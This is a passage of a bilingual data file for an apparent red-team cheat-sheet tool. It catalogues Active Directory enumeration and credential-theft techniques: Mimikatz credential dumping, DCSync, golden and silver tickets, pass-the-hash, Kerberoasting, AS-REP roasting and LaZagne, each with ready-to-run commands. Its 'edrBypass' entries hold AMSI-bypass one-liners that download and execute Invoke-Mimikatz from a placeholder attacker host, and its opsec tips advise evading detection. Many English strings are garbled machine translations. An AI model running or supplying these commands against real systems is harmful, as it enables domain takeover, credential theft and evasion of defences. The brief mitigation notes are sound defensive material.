        description: { zh: '查看域管理员组成员', en: 'View Domain Admins group members' },
        platform: 'windows'
      },
      {
        title: { zh: 'PowerView枚举', en: 'PowerViewEnumeration' },
        command: 'Get-NetGroup | select samaccountname,admincount',
        description: { zh: '使用PowerView枚举组', en: 'UsePowerViewEnumerationGroups' },
        platform: 'windows'
      },
      {
        title: { zh: '查找高权限组', en: 'FindHighPermissionGroups' },
        command: 'Get-NetGroup -AdminCount | select samaccountname',
        description: { zh: '查找高权限组', en: 'FindHighPermissionGroups' },
        platform: 'windows'
      },
      {
        title: { zh: '组成员关系', en: 'Group membership relationships' },
        command: 'Get-NetGroupMember "Domain Admins" | select membername',
        description: { zh: '获取组成员', en: 'Get group members' },
        platform: 'windows'
      },
      {
        title: { zh: '递归组成员', en: 'Recursive group members' },
        command: 'Get-NetGroupMember "Domain Admins" -Recurse',
        description: { zh: '递归获取组成员（包括嵌套组）', en: 'Recursively get group members (including nested groups)' },
        platform: 'windows'
      }
    ],
    analysis: { zh: '组枚举可以发现高权限组、组成员关系、嵌套组等。', en: 'Group enumeration reveals high-privilege groups, membership relationships, nested groups, and more.' },
    opsecTips: [{ zh: '组枚举是正常操作', en: 'Group Enumeration is normaloperation' }, { zh: '重点关注高权限组', en: 'Focus on high-privilege groups' }, { zh: '注意嵌套组关系', en: 'Pay attention to nested group relationships' }],
    tutorial: {
      overview: { zh: '组枚举可以发现域内所有组，识别高权限组和成员关系。', en: 'Group enumeration discovers all groups in the domain and identifies high-privilege groups and membership relationships.' },
      vulnerability: { zh: 'Active Directory允许普通用户查询组信息。', en: 'Active Directory allows regular users to query group information.' },
      exploitation: { zh: '利用流程：1) 枚举组；2) 识别高权限组；3) 获取组成员；4) 针对性攻击。', en: 'Exploitation workflow: 1) Enumerate groups; 2) Identify high-privilege groups; 3) Retrieve group members; 4) Launch targeted attacks.' },
      mitigation: { zh: '防御措施：1) 审计组成员关系；2) 最小权限原则；3) 监控异常查询。', en: 'Defenses: 1) Audit group membership relationships; 2) Apply the principle of least privilege; 3) Monitor anomalous queries.' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'gpo-enum',
    name: { zh: 'GPO枚举', en: 'GPO Enumeration' },
    description: { zh: '枚举组策略对象', en: 'EnumerationGroup Policy for Object' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    subCategory: 'GPO',
    tags: ['gpo', 'group-policy', 'enumeration'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: '任意域用户凭证', en: 'ArbitraryDomain UsersCredentials' }],
    execution: [
      {
        title: { zh: '列出GPO', en: 'ListGPO' },
        command: 'Get-GPO -All',
        description: { zh: '列出所有GPO', en: 'ListallGPO' },
        platform: 'windows'
      },
      {
        title: { zh: 'PowerView枚举', en: 'PowerViewEnumeration' },
        command: 'Get-NetGPO | select displayname,whencreated',
        description: { zh: '使用PowerView枚举GPO', en: 'UsePowerViewEnumerationGPO' },
        platform: 'windows'
      },
      {
        title: { zh: 'GPO权限', en: 'GPOPermission' },
        command: 'Get-NetGPOGroup',
        description: { zh: '查找GPO中的受限组', en: 'Find restricted groups in GPOs' },
        platform: 'windows'
      },
      {
        title: { zh: 'GPP密码', en: 'GPPPassword' },
        command: 'Get-NetGPPPassword',
        description: { zh: '查找GPP中的密码', en: 'FindGPPMiddle Password' },
        platform: 'windows'
      },
      {
        title: { zh: '查找可利用GPO', en: 'FindCanExploitationGPO' },
        command: 'Find-GPOLocation -UserName user',
        description: { zh: '查找用户受哪些GPO影响', en: 'Find which GPOs affect a user' },
        platform: 'windows'
      }
    ],
    analysis: { zh: 'GPO枚举可以发现组策略配置、GPP密码、受限组等信息。', en: 'GPO enumeration reveals group policy configurations, GPP passwords, restricted groups, and more.' },
    opsecTips: [{ zh: 'GPP密码是常见的信息泄露点', en: 'GPPPassword is common InformationLeakpoint' }, { zh: 'GPO可能包含敏感配置', en: 'GPOPossiblecontainsSensitiveConfiguration' }, { zh: '注意GPO修改权限', en: 'NoteGPOModifyPermission' }],
    tutorial: {
      overview: { zh: 'GPO枚举可以发现组策略配置，可能包含密码等敏感信息。', en: 'GPO EnumerationcanDiscoverGroup PolicyConfiguration, PossiblecontainsPassword etc.SensitiveInformation.' },
      vulnerability: { zh: 'GPP(Group Policy Preferences)可能包含加密存储的密码，可被解密。', en: 'GPP(Group Policy Preferences)PossiblecontainsEncryptionstorage Password, Can by Decryption.' },
      exploitation: { zh: '利用流程：1) 枚举GPO；2) 查找GPP密码；3) 解密密码；4) 使用凭证。', en: 'Exploitationworkflow: 1) EnumerationGPO; 2) FindGPPPassword; 3) DecryptionPassword; 4) UseCredentials.' },
      mitigation: { zh: '防御措施：1) 移除GPP中的密码；2) 使用LAPS管理本地管理员密码；3) 监控GPO修改。', en: 'Defensemeasures: 1) RemoveGPPMiddle Password; 2) UseLAPSManagementLocal AdminsPassword; 3) MonitoringGPOModify.' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'acl-enum',
    name: { zh: 'ACL枚举', en: 'ACL Enumeration' },
    description: { zh: '枚举访问控制列表', en: 'Enumerationaccess controlcolumntable' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    subCategory: 'ACL',
    tags: ['acl', 'access-control', 'enumeration'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: '任意域用户凭证', en: 'ArbitraryDomain UsersCredentials' }],
    execution: [
      {
        title: { zh: 'PowerView ACL枚举', en: 'PowerView ACL Enumeration' },
        command: 'Get-ObjectAcl -SamAccountName user -ResolveGUIDs',
        description: { zh: '获取用户对象的ACL', en: 'ObtainUsers for Object ACL' },
        platform: 'windows'
      },
      {
        title: { zh: '查找危险权限', en: 'FindDangerousPermission' },
        command: 'Find-InterestingDomainAcl -ResolveGUIDs',
        description: { zh: '查找有趣的ACL权限', en: 'Find interesting ACL permissions' },
        platform: 'windows'
      },
      {
        title: { zh: '查找WriteDACL', en: 'FindWriteDACL' },
        command: 'Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}',
        description: { zh: '查找WriteDACL权限', en: 'FindWriteDACLPermission' },
        platform: 'windows'
      },
      {
        title: { zh: '查找GenericAll', en: 'FindGenericAll' },
        command: 'Get-ObjectAcl -SamAccountName target -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}',
        description: { zh: '查找GenericAll权限', en: 'FindGenericAllPermission' },
        platform: 'windows'
      },
      {
        title: { zh: 'BloodHound ACL分析', en: 'BloodHound ACLAnalyze' },
        command: 'MATCH (n)-[r:AllExtendedRights]->(m) RETURN n,m',
        description: { zh: 'BloodHound查询ACL关系', en: 'BloodHound ACL relationship query' },
        platform: 'all'
      }
    ],
    analysis: { zh: 'ACL枚举可以发现权限配置错误，如WriteDACL、GenericAll等危险权限。', en: 'ACL EnumerationcanDiscoverPermissionConfigurationError, such as WriteDACL, GenericAll etc.DangerousPermission.' },
    opsecTips: [{ zh: 'ACL错误配置是常见的提权路径', en: 'ACLErrorConfiguration is common Privilege escalationPath' }, { zh: '重点关注高价值目标', en: 'Focus on high-value targets' }, { zh: 'BloodHound可可视化ACL关系', en: 'BloodHound can visualize ACL relationships' }],
    tutorial: {
      overview: { zh: 'ACL枚举可以发现Active Directory中的权限配置错误。', en: 'ACL EnumerationcanDiscoverActive DirectoryMiddle PermissionConfigurationError.' },
      vulnerability: { zh: 'AD中可能存在权限配置错误，允许低权限用户修改高权限对象。', en: 'AD may contain permission misconfigurations that allow low-privilege users to modify high-privilege objects.' },
      exploitation: { zh: '利用流程：1) 枚举ACL；2) 发现权限配置错误；3) 利用权限；4) 提升权限。', en: 'Exploitation workflow: 1) Enumerate ACLs; 2) Discover permission misconfigurations; 3) Exploit the permissions; 4) Escalate privileges.' },
      mitigation: { zh: '防御措施：1) 定期审计ACL；2) 最小权限原则；3) 监控ACL修改。', en: 'Defenses: 1) Regularly audit ACLs; 2) Apply the principle of least privilege; 3) Monitor ACL modifications.' },
      difficulty: 'advanced'
    }
  },
  {
    id: 'trust-enum',
    name: { zh: '信任关系枚举', en: 'Trust Relationship Enumeration' },
    description: { zh: '枚举域信任关系', en: 'EnumerationDomainTrust Relationships' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    subCategory: { zh: '信任关系', en: 'Trust Relationships' },
    tags: ['trust', 'enumeration', 'active-directory'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: '任意域用户凭证', en: 'ArbitraryDomain UsersCredentials' }],
    execution: [
      {
        title: { zh: '域信任关系', en: 'DomainTrust Relationships' },
        command: 'nltest /domain_trusts',
        description: { zh: '列出域信任关系', en: 'ListDomainTrust Relationships' },
        platform: 'windows'
      },
      {
        title: { zh: 'PowerView枚举', en: 'PowerViewEnumeration' },
        command: 'Get-NetDomainTrust',
        description: { zh: '使用PowerView枚举信任关系', en: 'UsePowerViewEnumerationTrust Relationships' },
        platform: 'windows'
      },
      {
        title: { zh: '森林信任', en: 'Forest trust' },
        command: 'Get-NetForestTrust',
        description: { zh: '枚举森林信任关系', en: 'Enumerate forest trust relationships' },
        platform: 'windows'
      },
      {
        title: { zh: '信任详细信息', en: 'Trust details' },
        command: 'Get-NetDomainTrust | select SourceDomain,TargetDomain,TrustType,TrustDirection',
        description: { zh: '查看信任详细信息', en: 'View trust details' },
        platform: 'windows'
      }
    ],
    analysis: { zh: '信任关系枚举可以发现跨域/跨森林攻击路径。', en: 'Trust relationship enumeration can uncover cross-domain and cross-forest attack paths.' },
    opsecTips: [{ zh: '信任关系可能提供跨域攻击路径', en: 'Trust relationships may provide cross-domain attack paths' }, { zh: '关注双向信任', en: 'Pay attention to bidirectional trusts' }, { zh: '注意SID历史问题', en: 'Watch for SID History issues' }],
    tutorial: {
      overview: { zh: '信任关系枚举可以发现域之间的信任关系，可能提供跨域攻击路径。', en: 'Trust relationship enumeration discovers inter-domain trust relationships that may provide cross-domain attack paths.' },
      vulnerability: { zh: '域信任关系可能允许跨域访问，攻击者可以利用信任关系进行横向移动。', en: 'DomainTrust RelationshipsPossibleAllowCrossDomainAccess, AttackPersoncanExploitationTrust Relationships perform Lateral Movement.' },
      exploitation: { zh: '利用流程：1) 枚举信任关系；2) 识别可利用的信任；3) 跨域攻击；4) 获取目标域权限。', en: 'Exploitation workflow: 1) Enumerate trust relationships; 2) Identify exploitable trusts; 3) Execute cross-domain attacks; 4) Gain target domain privileges.' },
      mitigation: { zh: '防御措施：1) 审计信任关系；2) 最小化信任范围；3) 监控跨域访问。', en: 'Defenses: 1) Audit trust relationships; 2) Minimize the trust scope; 3) Monitor cross-domain access.' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'computer-enum',
    name: { zh: '计算机枚举', en: 'Computer Enumeration' },
    description: { zh: '枚举域内计算机', en: 'EnumerationDomainInsideComputers' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    subCategory: { zh: '计算机', en: 'Computers' },
    tags: ['computer', 'enumeration', 'active-directory'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: '任意域用户凭证', en: 'ArbitraryDomain UsersCredentials' }],
    execution: [
      {
        title: { zh: '列出域计算机', en: 'ListDomainComputers' },
        command: 'net group "Domain Computers" /domain',
        description: { zh: '列出域计算机', en: 'ListDomainComputers' },
        platform: 'windows'
      },
      {
        title: { zh: 'PowerView枚举', en: 'PowerViewEnumeration' },
        command: 'Get-NetComputer | select name,operatingsystem,ipv4address',
        description: { zh: '使用PowerView枚举计算机', en: 'UsePowerViewEnumerationComputers' },
        platform: 'windows'
      },
      {
        title: { zh: '查找域控制器', en: 'FindDomainController' },
        command: 'Get-NetComputer -DomainController',
        description: { zh: '查找域控制器', en: 'FindDomainController' },
        platform: 'windows'
      },
      {
        title: { zh: '查找特定系统', en: 'FindspecificSystem' },
        command: 'Get-NetComputer -OperatingSystem "*Server 2019*"',
        description: { zh: '查找特定操作系统', en: 'FindspecificOperating System' },
        platform: 'windows'
      },
      {
        title: { zh: '查找活跃计算机', en: 'Find active computers' },
        command: 'Get-NetComputer -Ping',
        description: { zh: '查找在线计算机', en: 'Find online computers' },
        platform: 'windows'
      },
      {
        title: { zh: '查找管理员会话', en: 'Find AdminsSession' },
        command: 'Find-DomainUserLocation',
        description: { zh: '查找域管理员登录位置', en: 'Find Domain Admin logon locations' },
        platform: 'windows'
      }
    ],
    analysis: { zh: '计算机枚举可以发现域内所有计算机，识别高价值目标。', en: 'Computer enumeration discovers all computers in the domain and identifies high-value targets.' },
    opsecTips: [{ zh: '计算机枚举是正常操作', en: 'Computer Enumeration is normaloperation' }, { zh: '重点关注域控制器和服务器', en: 'Focus on domain controllers and servers' }, { zh: '查找管理员会话', en: 'Find AdminsSession' }],
    tutorial: {
      overview: { zh: '计算机枚举可以发现域内所有计算机，识别高价值目标。', en: 'Computer enumeration discovers all computers in the domain and identifies high-value targets.' },
      vulnerability: { zh: 'Active Directory允许普通用户查询计算机信息。', en: 'Active Directory allows regular users to query computer information.' },
      exploitation: { zh: '利用流程：1) 枚举计算机；2) 识别高价值目标；3) 扫描服务；4) 横向移动。', en: 'Exploitation workflow: 1) Enumerate computers; 2) Identify high-value targets; 3) Scan services; 4) Perform lateral movement.' },
      mitigation: { zh: '防御措施：1) 限制计算机信息查询；2) 监控异常查询；3) 网络分段。', en: 'Defenses: 1) Restrict computer information queries; 2) Monitor anomalous queries; 3) Implement network segmentation.' },
      difficulty: 'beginner'
    }
  },

  // ==================== 凭证窃取 ====================
  {
    id: 'mimikatz-creds',
    name: { zh: 'Mimikatz凭证抓取', en: 'Mimikatz Credential Dumping' },
    description: { zh: '使用Mimikatz抓取Windows系统凭证', en: 'Use Mimikatz to dump Windows system credentials' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: 'Mimikatz',
    tags: ['mimikatz', 'credentials', 'windows', 'lsass'],
    prerequisites: [{ zh: '需要管理员权限', en: 'requiresManagementMemberPermission' }, { zh: '需要绕过杀毒软件', en: 'requiresBypassAntivirus' }, { zh: 'Windows系统', en: 'WindowsSystem' }],
    execution: [
      {
        title: { zh: '抓取所有凭证', en: 'Dump all credentials' },
        command: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
        description: { zh: '抓取LSASS中的所有登录凭证', en: 'Dump all logon credentials from LSASS' },
        platform: 'windows',
        requiresAdmin: true,
        syntaxBreakdown: [
          { part: 'privilege::debug', explanation: { zh: '获取Debug权限，需要管理员权限', en: 'Obtain Debug Privilege, requiresManagementMemberPermission' }, type: 'command' },
          { part: 'sekurlsa::logonpasswords', explanation: { zh: '从LSASS导出所有登录凭证', en: 'from LSASSExportallLoginCredentials' }, type: 'command' },
          { part: 'exit', explanation: { zh: '执行完毕后退出', en: 'Exit after execution completes' }, type: 'command' }
        ]
      },
      {
        title: { zh: '导出LSASS', en: 'Export LSASS' },
        command: 'mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"',
        description: { zh: '从LSASS转储文件中提取凭证', en: 'Extract credentials from an LSASS dump file' },
        platform: 'windows',
        requiresAdmin: true
      },
      {
        title: 'Pass-the-Hash',
        command: 'mimikatz.exe "sekurlsa::pth /user:Administrator /domain:target.com /ntlm:HASH" "exit"',
        description: { zh: '使用NTLM哈希进行Pass-the-Hash攻击', en: 'UseNTLMhash perform Pass-the-Hash Attack' },
        platform: 'windows',
        requiresAdmin: true
      },
      {
        title: { zh: 'DCSync攻击', en: 'DCSync Attack' },
        command: 'mimikatz.exe "lsadump::dcsync /domain:target.com /user:Administrator" "exit"',
        description: { zh: '模拟DC同步获取域内所有用户哈希', en: 'Simulate DC replication to obtain all domain user hashes' },
        platform: 'windows',
        requiresAdmin: true,
        syntaxBreakdown: [
          { part: 'lsadump::dcsync', explanation: { zh: 'DCSync命令，模拟域控制器复制', en: 'DCSync command — simulate domain controller replication' }, type: 'command' },
          { part: '/domain:', explanation: { zh: '目标域名', en: 'TargetDomain name' }, type: 'parameter' },
          { part: '/user:', explanation: { zh: '要同步的用户', en: 'NeedSamestep Users' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '导出所有哈希', en: 'Exportallhash' },
        command: 'mimikatz.exe "lsadump::lsa /inject" "exit"',
        description: { zh: '从LSA导出所有用户哈希', en: 'from LSAExportallUsershash' },
        platform: 'windows',
        requiresAdmin: true
      },
      {
        title: { zh: '黄金票据', en: 'Golden Ticket' },
        command: 'mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator" "exit"',
        description: { zh: '生成黄金票据获取域管理员权限', en: 'Generate a Golden Ticket to gain Domain Admin privileges' },
        platform: 'windows',
        requiresAdmin: true,
        syntaxBreakdown: [
          { part: 'kerberos::golden', explanation: { zh: '生成黄金票据命令', en: 'GenerateGolden TicketCommand' }, type: 'command' },
          { part: '/sid:', explanation: { zh: '域SID', en: 'DomainSID' }, type: 'parameter' },
          { part: '/krbtgt:', explanation: { zh: 'krbtgt账户的NTLM哈希', en: 'krbtgtAccount NTLMhash' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '白银票据', en: 'Silver Ticket' },
        command: 'mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /target:server.target.com /service:cifs /rc4:HASH /user:Administrator" "exit"',
        description: { zh: '生成白银票据访问特定服务', en: 'GenerateSilver TicketAccessspecificService' },
        platform: 'windows',
        requiresAdmin: true
      }
    ],
    edrBypass: [
      {
        title: { zh: 'PowerShell加载', en: 'PowerShellLoad' },
        command: 'IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"',
        description: { zh: '通过PowerShell远程加载Mimikatz', en: 'throughPowerShellRemoteLoadMimikatz' }
      },
      {
        title: { zh: 'AMSI绕过', en: 'AMSI Bypass' },
        command: 'SET-ITEM -PATH "HKLM:\\SOFTWARE\\Microsoft\\AMSI" -NAME "AllowBlocking" -VALUE 1; IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1")',
        description: { zh: '禁用AMSI后加载Mimikatz', en: 'DisableAMSIAfterLoadMimikatz' }
      },
      {
        title: { zh: '混淆执行', en: 'ObfuscationExecute' },
        command: `$a='[Ref].Assembly.GetType'('System.Management.Automation.AmsiUtils');$b=$a.GetField'('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true);IEX(New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')`,
        description: { zh: '通过反射绕过AMSI', en: 'throughReflectionBypassAMSI' }
      }
    ],
    analysis: { zh: '成功执行后可获取明文密码、NTLM哈希、Kerberos票据等凭证信息。', en: 'SuccessExecuteAfterCanObtainplaintextPassword, NTLMhash, KerberosTicket etc.CredentialsInformation.' },
    opsecTips: [{ zh: 'Mimikatz会被大多数杀软检测', en: 'Mimikatz is detected by most antivirus solutions' }, { zh: '使用混淆或内存加载绕过检测', en: 'UseObfuscation or Memory LoadBypassDetection' }, { zh: '优先考虑使用其他更隐蔽的工具', en: 'Consider using stealthier alternatives first' }, { zh: '操作LSASS会触发EDR告警', en: 'operationLSASSWillTriggerEDRAlert' }],
    tutorial: {
      overview: { zh: 'Mimikatz是一款强大的Windows安全测试工具，可以从内存中提取明文密码、哈希、Kerberos票据等凭证信息。', en: 'Mimikatz is a powerful Windows security testing tool that can extract plaintext passwords, hashes, Kerberos tickets, and other credentials from memory.' },
      vulnerability: { zh: 'Windows系统将用户凭证存储在LSASS进程内存中，Mimikatz可以直接读取这些凭证。这是Windows认证机制的设计特性。', en: 'Windows stores user credentials in the LSASS process memory, and Mimikatz can read them directly. This is by design in the Windows authentication mechanism.' },
      exploitation: { zh: '利用流程：1) 获取管理员权限；2) 绕过杀毒软件；3) 执行Mimikatz抓取凭证；4) 使用凭证进行横向移动；5) 提升到域管理员权限。', en: 'Exploitation workflow: 1) Obtain administrator privileges; 2) Bypass antivirus; 3) Run Mimikatz to dump credentials; 4) Use credentials for lateral movement; 5) Escalate to Domain Admin.' },
      mitigation: { zh: '防御措施：1) 启用Credential Guard；2) 限制管理员权限；3) 监控LSASS访问；4) 部署EDR解决方案；5) 定期更改密码。', en: 'Defenses: 1) Enable Credential Guard; 2) Restrict administrator privileges; 3) Monitor LSASS access; 4) Deploy an EDR solution; 5) Rotate passwords regularly.' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'kerberoasting',
    name: { zh: 'Kerberoasting攻击', en: 'Kerberoasting Attack' },
    description: { zh: 'Kerberoasting攻击获取服务账户哈希', en: 'Kerberoasting AttackGet ServicesAccounthash' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: 'Kerberos',
    tags: ['kerberoasting', 'kerberos', 'active-directory', 'spn'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: '任意域用户凭证', en: 'ArbitraryDomain UsersCredentials' }, { zh: '域内存在SPN账户', en: 'DomainMemory in SPNAccount' }],
    execution: [
      {
        title: { zh: '发现SPN', en: 'DiscoverSPN' },
        command: 'setspn -T domain.com -Q */*',
        description: { zh: '查询域内所有SPN', en: 'QueryDomainInsideallSPN' },
        platform: 'windows'
      },
      {
        title: { zh: '请求服务票据', en: 'Request Service Ticket' },
        command: 'Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/webserver.target.com"',
        description: { zh: 'PowerShell请求Kerberos票据', en: 'PowerShellRequestKerberosTicket' },
        platform: 'windows'
      },
      {
        title: { zh: '导出票据', en: 'Export Tickets' },
        command: 'mimikatz.exe "kerberos::list /export" "exit"',
        description: { zh: '使用Mimikatz导出Kerberos票据', en: 'UseMimikatzExportKerberosTicket' },
        platform: 'windows'
      },
      {
        title: { zh: 'Rubeus请求', en: 'RubeusRequest' },
        command: 'Rubeus.exe kerberoast /stats',
        description: { zh: '使用Rubeus进行Kerberoasting', en: 'UseRubeus perform Kerberoasting' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'Rubeus.exe', explanation: { zh: 'Kerberos攻击工具', en: 'KerberosAttackTools' }, type: 'command' },
          { part: 'kerberoast', explanation: { zh: 'Kerberoasting模块', en: 'KerberoastingModule' }, type: 'command' },
          { part: '/stats', explanation: { zh: '显示统计信息', en: 'Display statistics' }, type: 'parameter' }
        ]
      },
      {
        title: 'Impacket GetUserSPNs',
        command: 'GetUserSPNs.py domain/user:password -dc-ip dc_ip -request',
        description: { zh: '使用Impacket获取服务票据', en: 'UseImpacketGet ServicesTicket' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'GetUserSPNs.py', explanation: { zh: 'Impacket Kerberoasting工具', en: 'Impacket KerberoastingTools' }, type: 'command' },
          { part: '-request', explanation: { zh: '请求服务票据', en: 'Request Service Ticket' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '离线破解', en: 'Offline cracking' },
        command: 'hashcat -m 13100 kerberoast.hash wordlist.txt',
        description: { zh: '使用Hashcat破解Kerberos票据', en: 'UseHashcatCrackKerberosTicket' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-m 13100', explanation: { zh: 'Kerberos 5 TGS-REP模式', en: 'Kerberos 5 TGS-REPMode' }, type: 'parameter' }
        ]
      }
    ],
    edrBypass: [
      {
        title: { zh: 'RC4加密', en: 'RC4Encryption' },
        command: 'Rubeus.exe kerberoast /rc4opsec',
        description: { zh: '使用RC4加密，避免触发告警', en: 'Use RC4 encryption to avoid triggering alerts' }
      }
    ],
    analysis: { zh: 'Kerberoasting可以获取服务账户的Kerberos票据，离线破解后得到明文密码。', en: 'Kerberoasting obtains Kerberos tickets for service accounts, which can be cracked offline to reveal plaintext passwords.' },
    opsecTips: [{ zh: 'Kerberoasting不需要高权限', en: 'Kerberoastingdoes not requireHighPermission' }, { zh: '只需要任意域用户凭证', en: 'only requiresArbitraryDomain UsersCredentials' }, { zh: '建议使用RC4加密避免检测', en: 'Recommended to use RC4 encryption to avoid detection' }],
    tutorial: {
      overview: { zh: 'Kerberoasting是一种针对Kerberos协议的攻击，攻击者可以请求服务票据并离线破解服务账户密码。', en: 'Kerberoasting is an attack targeting the Kerberos protocol where the attacker requests service tickets and cracks service account passwords offline.' },
      vulnerability: { zh: 'Kerberos服务票据使用服务账户密码加密，攻击者可以请求票据后离线破解。服务账户通常密码复杂度较低。', en: 'Kerberos service tickets are encrypted with the service account password. Attackers can request tickets and crack them offline. Service accounts often have weak password complexity.' },
      exploitation: { zh: '利用流程：1) 获取任意域用户凭证；2) 查询域内SPN；3) 请求服务票据；4) 导出票据；5) 离线破解密码。', en: 'Exploitation workflow: 1) Obtain any domain user credentials; 2) Query SPNs in the domain; 3) Request service tickets; 4) Export tickets; 5) Crack passwords offline.' },
      mitigation: { zh: '防御措施：1) 服务账户使用强密码；2) 监控异常的票据请求；3) 定期轮换服务账户密码；4) 部署蜜罐账户检测攻击。', en: 'Defenses: 1) Use strong passwords for service accounts; 2) Monitor anomalous ticket requests; 3) Rotate service account passwords regularly; 4) Deploy honeypot accounts to detect attacks.' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'asreproasting',
    name: 'AS-REP Roasting',
    description: { zh: 'AS-REP Roasting攻击获取用户哈希', en: 'AS-REP RoastingAttackObtainUsershash' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: 'Kerberos',
    tags: ['asreproasting', 'kerberos', 'active-directory'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: '域中存在禁用Pre-auth的用户', en: 'DomainMiddlehasDisablePre-auth Users' }],
    execution: [
      {
        title: { zh: 'Rubeus攻击', en: 'RubeusAttack' },
        command: 'Rubeus.exe asreproast',
        description: { zh: '使用Rubeus进行AS-REP Roasting', en: 'UseRubeus perform AS-REP Roasting' },
        platform: 'windows'
      },
      {
        title: { zh: 'Impacket攻击', en: 'ImpacketAttack' },
        command: 'GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt',
        description: { zh: '使用Impacket获取AS-REP', en: 'UseImpacketObtainAS-REP' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'GetNPUsers.py', explanation: { zh: 'Impacket AS-REP Roasting工具', en: 'Impacket AS-REP RoastingTools' }, type: 'command' },
          { part: '-usersfile', explanation: { zh: '用户列表文件', en: 'User ListFile' }, type: 'parameter' },
          { part: '-format hashcat', explanation: { zh: '输出hashcat格式', en: 'OutputhashcatFormat' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '查找禁用Pre-auth用户', en: 'FindDisablePre-authUsers' },
        command: 'Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth',
        description: { zh: '查找禁用Pre-auth的用户', en: 'FindDisablePre-auth Users' },
        platform: 'windows'
      },
      {
        title: { zh: '破解哈希', en: 'Crack Hash' },
        command: 'hashcat -m 18200 asrep.hash wordlist.txt',
        description: { zh: '使用Hashcat破解AS-REP哈希', en: 'UseHashcatCrackAS-REPhash' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-m 18200', explanation: { zh: 'Kerberos 5 AS-REP模式', en: 'Kerberos 5 AS-REPMode' }, type: 'parameter' }
        ]
      }
    ],
    analysis: { zh: 'AS-REP Roasting可以获取禁用Pre-auth用户的哈希，离线破解后得到明文密码。', en: 'AS-REP Roasting obtains hashes for users with Pre-authentication disabled, which can be cracked offline to reveal plaintext passwords.' },
    opsecTips: [{ zh: '不需要任何凭证', en: 'Does not require any credentials' }, { zh: '只需要用户名', en: 'only requiresUsername' }, { zh: '禁用Pre-auth是错误配置', en: 'DisablePre-auth is ErrorConfiguration' }],
    tutorial: {
      overview: { zh: 'AS-REP Roasting是一种针对禁用Kerberos Pre-authentication用户的攻击。', en: 'AS-REP Roasting is OneTargeting for DisableKerberos Pre-authenticationUsers Attack.' },
      vulnerability: { zh: '禁用Pre-auth的用户可以直接获取AS-REP，其中包含可离线破解的哈希。', en: 'Users with Pre-authentication disabled allow direct retrieval of AS-REP responses containing offline-crackable hashes.' },
      exploitation: { zh: '利用流程：1) 查找禁用Pre-auth的用户；2) 请求AS-REP；3) 提取哈希；4) 离线破解。', en: 'Exploitation workflow: 1) Find users with Pre-auth disabled; 2) Request AS-REP; 3) Extract hashes; 4) Crack offline.' },
      mitigation: { zh: '防御措施：1) 启用所有用户的Pre-auth；2) 监控异常的AS-REQ；3) 使用强密码。', en: 'Defenses: 1) Enable Pre-authentication for all users; 2) Monitor anomalous AS-REQ requests; 3) Use strong passwords.' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'lazagne-creds',
    name: { zh: 'LaZagne凭证抓取', en: 'LaZagne Credential Dumping' },
    description: { zh: '使用LaZagne抓取各种应用程序凭证', en: 'Use LaZagne to dump credentials from various applications' },
    category: { zh: '凭证窃取', en: 'Credential Theft' },
    subCategory: { zh: '工具', en: 'Tools' },
    tags: ['lazagne', 'credentials', 'browsers', 'applications'],
    prerequisites: [{ zh: '目标机器访问权限', en: 'TargetMachineAccessPermission' }, { zh: 'LaZagne工具', en: 'LaZagneTools' }],
    execution: [
      {
        title: { zh: '抓取所有凭证', en: 'Dump all credentials' },
        command: 'laZagne.exe all',
        description: { zh: '抓取所有支持的凭证', en: 'Dump all supported credentials' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'laZagne.exe', explanation: { zh: 'LaZagne凭证抓取工具', en: 'LaZagne Credential DumpingTools' }, type: 'command' },
          { part: 'all', explanation: { zh: '抓取所有模块', en: 'Dump all modules' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '浏览器凭证', en: 'BrowserCredentials' },
        command: 'laZagne.exe browsers',
